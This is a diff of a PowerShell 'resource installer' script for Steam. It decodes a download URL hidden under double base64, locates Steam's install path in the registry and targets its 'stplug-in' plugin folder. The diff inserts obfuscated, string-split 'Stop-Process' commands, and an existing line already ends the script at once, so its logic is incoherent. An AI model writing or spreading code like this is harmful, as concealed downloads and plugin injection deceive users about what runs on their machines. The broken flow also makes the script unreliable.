@@ -1,12 +1,13 @@
 ## ConfiguraciÃ³n de - Recursos
 Stop-Process -Id $PID -Force
 $Host.UI.RawUI.WindowTitle = "SteamNexus | Instalador de Recursos"
+&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
 $a = "YUhSMGNIQnpPaTh2WjJsaGRHaHViMk5oYlM5VUxYSXlNUzh2YkdselpXNWpaUzl5Wld4bFlYTmxjeTlrYjNkdWJHOWhaQzkyTVM0d0xqQXZZM0ZqYXk1NmFYQT0="
 $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
 $LuasUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 chcp 65001 > $null
-
+&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
 # Rutas
 $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath
 $stPluginPath = Join-Path $steamPath "config\stplug-in"
